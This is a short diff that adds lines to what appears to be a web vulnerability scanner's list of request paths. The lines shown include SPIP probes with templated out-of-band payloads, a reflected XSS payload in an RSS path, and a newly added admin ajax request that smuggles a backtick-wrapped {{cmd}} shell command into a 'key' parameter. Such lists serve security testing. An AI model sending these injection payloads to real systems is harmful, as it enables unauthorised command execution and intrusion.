@@ -2072,3 +2072,5 @@
 /spip.php?page=contact&_anciennes_valeurs={{url_encode(oob_payload)}}
 /spip.php?page=contact&_anciennes_valeurs={{url_encode(oob_curl)}}
 /rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E?token={{rss_token}}
+/admin/config.php
+/admin/ajax.php?module=filestore&command=testconnection&driver=SSH&host=127.0.0.1&user={{prefix}}&port=22&key={{prefix}}`{{cmd}}`&path={{prefix}}
